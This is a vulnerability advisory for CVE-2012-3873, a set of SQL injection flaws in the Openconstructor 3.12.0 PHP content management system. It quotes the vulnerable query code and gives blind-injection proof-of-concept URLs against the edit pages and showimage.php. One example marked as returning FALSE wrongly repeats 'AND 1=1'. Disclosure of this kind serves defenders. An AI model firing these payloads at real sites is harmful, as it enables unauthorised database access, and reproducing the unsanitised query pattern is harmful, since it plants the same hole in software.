###Description###:
Openconstructor (formerly known as eSector Solutions Web Constructor) is an open source web Content Management System written in PHP.
Multiple SQL injection vulnerabilities exist on the 'id' parameter, which is used across different sections of the application.
Verson 3.12.0 is vulnerable, previous version may be affected, but they have not been tested.

###CVE###
CVE-2012-3873


###Impact###:
Authenticated attackers can execute arbitrary SQL queries.

CVSS Base Score: 9.0 (AV:N/AC:L/Au:S/C:C/I:C/A:C)

###Details###:
The following lines of code are the cause of the issue:

  ds->get_record($_GET['id'])

get_record() perform a query on the database, without checking the user supplied data in the 'id' parameter. The following pages are vulnerable:

data/gallery/edit.php
data/guestbook/edit.php
data/file/edit.php
data/htmltext/edit.php
data/publication/edit.php
data/event/edit.php

'getimage/showimage.php' is also vulnerable, due to the following lines of code:

$res = $db->query(
                'SELECT id, name, filename, size, type, date'.
                ' FROM dsfile'.
                ' WHERE id='.$_GET['id']
    );


###Proof of Concept###:
An object (eg:gallery object, file object, guestbook object ...) must first be created or has to already exist in order to exploit the vulnerability.
For instance, if a guestbook object has been created, an attacker can open it in edit page and exploit a blind SQL injection as follows:

http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a TRUE value for the query
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=1&id=4 AND 1=1 #returns a FALSE value for the query

In my test environment, I have been able to confirm the possibility to execute queries with the following commands:

http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)='5.5.16-log' #returns a TRUE value for the query
http://hostname/openconstructor/data/guestbook/edit.php?ds_id=10&id=4 AND (select @@version)='5.5.16-foo' #returns a FALSE value for the query

On 'getimage/showimage.php', an image file must be first successfully uploaded. The exploitation is very similar:

http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-foo' # returns a FALSE value for the query
http://hostname/openconstructor/getimage/showimage.php?id=1%20AND%20(select%20@@version)='5.5.16-log' # return a TRUE value for the query
